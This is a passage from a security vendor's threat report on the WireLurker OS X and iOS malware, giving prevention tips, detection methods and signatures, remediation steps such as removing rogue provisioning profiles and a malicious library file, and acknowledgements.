OS X or iOS malware threats:\n\n   - Enterprises should assure their mobile device traffic is routed through a threat\nprevention system using a mobile security application like GlobalProtect[™]\n\n   - Employ an antivirus or security protection product for the Mac OS X system\nand keep its signatures up-to-date\n\n   - In the OS X System Preferences panel under “Security & Privacy”, ensure\n“Allow apps downloaded from Mac App Store (or Mac App Store and identified\ndevelopers)” is set\n\n   - Do not download and run Mac applications or games from any third-party app\nstore, download site or other untrusted source\n\n   - Keep the iOS version on your device up-to-date\n\n   - Do not accept any unknown enterprise provisioning profile unless an\nauthorized, trusted party (e.g. your IT corporate help desk) explicitly instructs\nyou to do so\n\n\n-----\n\n   - Do not pair your iOS device with untrusted or unknown computers or devices\n\n   - Avoid powering your iOS device through chargers from untrusted or unknown\nsources.\n\n   - Similarly, avoid connecting iOS devices with untrusted or unknown\naccessories or computers (Mac or PC)\n\n   - Do not jailbreak your iOS device; If you do jailbreak it, only use credible\nCydia community sources and avoid the use or storage of sensitive personal\ninformation on that device.\n\n#### Detection and Containment\n\nFrom May 21, 2014, through September 28, 2014, five different WireLurker files\n(representing three different versions) were submitted to VirusTotal; however, none of\nthe 55 threat detection engines employed by VirusTotal identified this threat (Figure\n31). Our hope is that this report will contribute to improved detection rates.\n\nFIGURE 31 + VirusTotal threat detection engines did not flag WireLurker as malware\n\nIn terms of network-based detection, Palo Alto Networks released two signatures\n(13748,13749) to detect all WireLurker C2 communication traffic. When our\ncustomers receive an alert for WireLurker from our unified platform, they can block\nthis traffic by deploying a strict policy.\n\nFor host-based detection, Mac and iOS users should check processes and files on\ntheir Mac computers and iOS devices. We wrote a Python script for OS X systems\nto detect known malicious and suspicious files, as well as applications that exhibit\ncharacteristics of infection. This script can be downloaded from the following URL:\n\n_https://github.com/PaloAltoNetworks-BD/WireLurkerDetector_\n\nBoth unified platform alerting/blocking and the output of the Python script referenced\nabove are meant to feed into incident response efforts, supporting containment\n(towards remediation) of this threat.\n\n\n-----\n\n#### Remediation\n\nIf WireLurker is found on any OS X computer, we recommend the deletion of\nrespective files and removal of applications reported by the script. As of the\npublication date of this report, the iOS component of WireLurker is only spread\nthrough an infected Mac computer; accordingly, if WireLurker is found on a Mac, we\nrecommend inspection of all iOS devices that have connected with that computer.\nA quick check for iOS devices includes determining whether any unauthorized\nenterprise provisioning profiles were created by navigating to “Settings -> General\n-> Profile”. If an anomalous profile is found, it should be removed and a subsequent\ncheck of all applications should be performed. Delete any strange applications found\non the device. For jailbroken devices, we recommend that you check whether the file\n“/Library/MobileSubstrate/DynamicLibraries/sfbase.dylib” exists. If so, you should\ndelete it through a terminal connection, via an application like MobileTerminal or\nSecure Shell (SSH).\n\n### Acknowledgements\n\nWe would like to thank CDSQ from the WeiPhone Technical Group for forwarding\nuser reports to us, Qū Chāo from Tencent Inc. for providing samples of WireLurker\nversion B, and Hui Gao, Xin Ouyang, Zhi Xu and Jin Chen of Palo Alto Networks for\nmaking sure our customers are well protected by our products.\n\nWe would also like to thank Rob Downs and Ryan Olson of Palo Alto Networks for\ntheir great effort on improving this report’s accuracy, fluency and quality.
